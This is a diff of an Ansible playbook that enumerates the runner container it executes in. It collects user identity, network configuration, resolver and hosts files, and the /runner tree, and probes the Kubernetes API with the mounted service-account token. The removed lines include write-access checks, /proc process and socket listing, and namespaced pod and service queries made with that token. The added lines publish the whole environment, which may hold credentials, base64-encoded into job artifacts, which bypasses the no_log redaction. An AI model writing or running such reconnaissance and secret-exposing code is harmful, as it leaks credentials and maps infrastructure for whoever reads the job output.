@@ -3,17 +3,9 @@
   hosts: all
   gather_facts: false
   vars:
-    outdir: "/runner/artifacts/{{ inventory_hostname }}/enum"
-    want_truncate: 8000
-
+    want_truncate: 8000        # keep JSON manageable
   tasks:
-    - name: Create artifact directory
-      file:
-        path: "{{ outdir }}"
-        state: directory
-        mode: "0750"
-
-    - name: System & runtime (portable, never fail)
+    - name: System & runtime (portable)
       shell: |
         {
           echo "== id ==";                       (id -a || true)
@@ -29,39 +21,41 @@
             else
               echo "ps not available"
             fi
-        } > "{{ outdir }}/system.txt" 2>&1
+        }
       args: { executable: /bin/sh }
+      register: sys_rt
+      changed_when: false
 
-    - name: Network posture (never fail)
+    - name: Network posture
       shell: |
         {
           echo "== ip a ==";         (ip a 2>/dev/null || true)
           echo "== ip r ==";         (ip r 2>/dev/null || true)
           echo "== resolv.conf ==";  (cat /etc/resolv.conf || true)
           echo "== hosts ==";        (cat /etc/hosts || true)
-        } > "{{ outdir }}/network.txt" 2>&1
+        }
       args: { executable: /bin/sh }
+      register: netinfo
+      changed_when: false
 
     - name: Ansible / Runner context
       shell: |
         {
           echo "== ansible --version ==";              (ansible --version || true)
           echo "== ansible-config dump (changed) ==";  (ansible-config dump --only-changed || true)
-          echo "== runner tree ==";                    (ls -lAR /runner 2>/dev/null || true)
-        } > "{{ outdir }}/ansible_runner.txt" 2>&1
+          echo "== runner tree (top-level) ==";        (ls -lA /runner 2>/dev/null || true)
+        }
       args: { executable: /bin/sh }
+      register: runner_ctx
+      changed_when: false
 
-    - name: Environment snapshot (written to artifacts; not echoed)
+    - name: Env snapshot (not echoed)
       shell: env | sort
       register: envout
       no_log: true
+      changed_when: false
 
-    - copy:
-        content: "{{ envout.stdout }}"
-        dest: "{{ outdir }}/env.txt"
-      no_log: true
-
-    - name: K8s serviceaccount probe (/version, read-only)
+    - name: K8s /version probe (read-only)
       shell: |
         d="/var/run/secrets/kubernetes.io/serviceaccount"
         [ -f "$d/token" ] || exit 0
@@ -74,108 +68,12 @@
       changed_when: false
       no_log: true
 
-    - copy:
-        content: "{{ k8s_ver.stdout | default('') }}"
-        dest: "{{ outdir }}/k8s_version.json }}"
-      when: k8s_ver is defined
-      no_log: true
-
-    # -------- Additional probes (MUST stay inside 'tasks:' list) --------
-
-    - name: Check common paths for write access
-      shell: |
-        for d in / /tmp /var/tmp /runner /runner/project /etc /root ; do
-          [ -d "$d" ] || continue
-          printf "%-20s " "$d"
-          (touch "$d"/.__wtest$$ 2>/dev/null && echo "writable" && rm -f "$d"/.__wtest$$) || echo "read-only"
-        done
-      args: { executable: /bin/sh }
-      register: writechk
-      changed_when: false
-
-    - set_stats:
+    - name: Publish into Job Artifacts (truncated for UI)
+      set_stats:
         data:
-          write_access: "{{ writechk.stdout }}"
-        aggregate: true
-
-    - name: Enumerate PIDs via /proc (no ps required)
-      shell: |
-        for p in /proc/[0-9]*; do
-          pid=$(basename "$p")
-          cmd=$(tr -d '\0' < "$p/cmdline" 2>/dev/null || true)
-          [ -z "$cmd" ] && cmd="[$(cat $p/comm 2>/dev/null || echo '?')]"
-          echo "$pid $cmd"
-        done | sort -n
-      args: { executable: /bin/sh }
-      register: proclite
-      changed_when: false
-
-    - set_stats:
-        data:
-          procs_lite: "{{ (proclite.stdout | default(''))[:want_truncate] }}"
-        aggregate: true
-
-    - name: List listening TCP sockets (/proc, no ss/netstat)
-      shell: |
-        awk 'NR>1 {print $2, $4}' /proc/net/tcp 2>/dev/null | sed 's/:/ /' || true
-      args: { executable: /bin/sh }
-      register: tcpl
-      changed_when: false
-
-    - set_stats:
-        data:
-          tcp_listeners_raw: "{{ tcpl.stdout }}"
-        aggregate: true
-
-    - name: Check for Kubernetes serviceaccount files (presence only)
-      shell: |
-        d="/var/run/secrets/kubernetes.io/serviceaccount"
-        [ -f "$d/token" ] && echo "token=present" || echo "token=absent"
-        [ -f "$d/namespace" ] && { printf "ns="; cat "$d/namespace"; } || echo "ns=?"
-        [ -f "$d/ca.crt" ] && echo "ca=present" || echo "ca=absent"
-      args: { executable: /bin/sh }
-      register: sa2
-      no_log: true
-      changed_when: false
-
-    - set_stats:
-        data:
-          sa_mount_info: "{{ sa2.stdout }}"
-        aggregate: true
-
-    - name: K8s namespaced GETs (pods/services) if SA exists
-      shell: |
-        d="/var/run/secrets/kubernetes.io/serviceaccount"
-        [ -f "$d/token" ] || exit 0
-        NS=$(cat "$d/namespace")
-        base="https://${KUBERNETES_SERVICE_HOST:-}:${KUBERNETES_SERVICE_PORT:-}"
-        hdr="-H Authorization: Bearer $(cat $d/token)"
-        ca="--cacert $d/ca.crt"
-        echo "GET $base/api/v1/namespaces/$NS/pods"
-        curl -sSk --max-time 5 $hdr $ca "$base/api/v1/namespaces/$NS/pods" | head -c 8000 || true
-        echo
-        echo "GET $base/api/v1/namespaces/$NS/services"
-        curl -sSk --max-time 5 $hdr $ca "$base/api/v1/namespaces/$NS/services" | head -c 8000 || true
-      args: { executable: /bin/sh }
-      register: k8s_ns
-      no_log: true
-      changed_when: false
-
-    - set_stats:
-        data:
-          k8s_ns_probe: "{{ k8s_ns.stdout }}"
-        aggregate: true
-
-    - name: List runner env/inventory/project trees (top 2 levels)
-      shell: |
-        for d in /runner/env /runner/inventory /runner/project ; do
-          [ -d "$d" ] && { echo "== $d =="; find "$d" -maxdepth 2 -type f -printf '%M %u:%g %p\n' ; }
-        done
-      args: { executable: /bin/sh }
-      register: trees
-      changed_when: false
-
-    - set_stats:
-        data:
-          runner_trees: "{{ (trees.stdout | default(''))[:want_truncate] }}"
+          system_txt: "{{ (sys_rt.stdout | default(''))[:want_truncate] }}"
+          network_txt: "{{ (netinfo.stdout | default(''))[:want_truncate] }}"
+          ansible_runner_txt: "{{ (runner_ctx.stdout | default(''))[:want_truncate] }}"
+          env_txt_b64: "{{ (envout.stdout | default('')) | b64encode }}"
+          k8s_version_json: "{{ (k8s_ver.stdout | default(''))[:want_truncate] }}"
         aggregate: true
